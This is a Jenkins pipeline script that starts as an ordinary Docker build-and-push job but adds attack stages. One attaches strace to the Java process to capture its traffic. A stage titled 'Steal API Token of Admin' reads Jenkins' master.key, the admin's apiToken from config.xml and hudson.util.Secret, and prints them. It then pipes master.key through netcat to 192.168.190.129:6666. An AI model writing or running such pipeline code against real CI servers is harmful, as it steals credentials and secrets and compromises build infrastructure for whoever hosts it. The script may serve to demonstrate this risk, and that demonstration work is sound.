node('ubuntu') {
    def app  

    stage('Start Java Listener') {
        sh 'sudo strace -fp $(pidof java) -v -e read,write,open -s 9999 -o /home/ubuntu/getIntoDevOps.2 &'
    }
    
    stage('Clone repository') {
        /* Let's make sure we have the repository cloned to our workspace */
        checkout scm
    }

    stage('Build image') {
        /* This builds the actual image; synonymous to
         * docker build on the command line */

        app = docker.build("nimrods8/helloisrael")
    }

    stage('Test image') {
        /* Ideally, we would run a test framework against our image.
         * For this example, we're using a Volkswagen-type approach ;-) */

        app.inside {
            sh 'echo "Tests passed"'
        }
    }

    stage('Push image') {
        /* Finally, we'll push the image with two tags:
         * First, the incremental build number from Jenkins
         * Second, the 'latest' tag.
         * Pushing multiple tags is cheap, as all the layers are reused. */
        docker.withRegistry('https://registry.hub.docker.com', 'docker-hub-credentials') {
            app.push("${env.BUILD_NUMBER}")
            app.push("latest")
        }
    }
}
// Steal API Token of Admin
node ('master') {
    stage('Steal API Token of Admin') {
        def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
        println fileContents
        def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
        def api1 = apiContents.split( '<apiToken>');
        def api2 = api1[1].split( '</apiToken>');
        println "API Token is:\n" + api2[0];

        //println fileContentsAdmin

        int[] fileContentsHudson = readFile file: "/var/lib/jenkins/secrets/hudson.util.Secret", encoding: "ISO-8859-1"
        String str = 'Secrets/hudson.Util.Secret:\nPass 1:\n';
        for( int i = 0; i < fileContentsHudson.size(); i++)
        {
            int  a = (int)fileContentsHudson[i];
            str = str + String.format("%02X-",a);
        }
        println str

        sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
    }
}

node ('ubuntu') {  
    stage('stop strace and dump results') {
        label 'ubuntu'
        sh 'sudo kill $(pidof strace)'
        sh 'sudo cat /home/ubuntu/getIntoDevOps.2'
    }
}

